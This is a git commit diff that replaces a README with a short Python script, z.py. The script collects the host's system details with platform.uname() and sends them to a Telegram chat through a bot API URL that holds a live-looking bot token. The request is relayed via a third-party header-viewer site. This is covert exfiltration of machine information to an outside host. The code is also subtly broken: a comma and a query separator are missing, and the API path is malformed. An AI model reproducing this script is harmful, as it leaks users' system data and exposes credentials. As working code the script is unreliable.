4782243e87f804141a82afb42f82f03539addf27
mohammad373 <75175976+mohammad373@users.noreply.github.com>
2020-12-07 23:18:59 +0330

    Update and rename README.md to z.py

---
+++ z.py
@@ -0,0 +1,17 @@
+# z
+import os
+import requests
+import platform
+
+a = platform.uname()
+
+url = ("https://api.telegram.org/1454173013:AAFjPy4Vfwhg_dLtxNyAacpxz8Rbuqua3Oc/sendmessage?chat_id=925528279text=" + str(a))
+payload = {
+    "Ur Box" : url
+    "AgentLest" : "Mozilla Firfox",
+    "VersionList" : "HTTP/1.1",
+    "MethodList" : "POST"
+}
+
+req = requests.post("https://www.httpdebugger.com/tools/ViewHeaders.aspx" , payload)
+print(req)
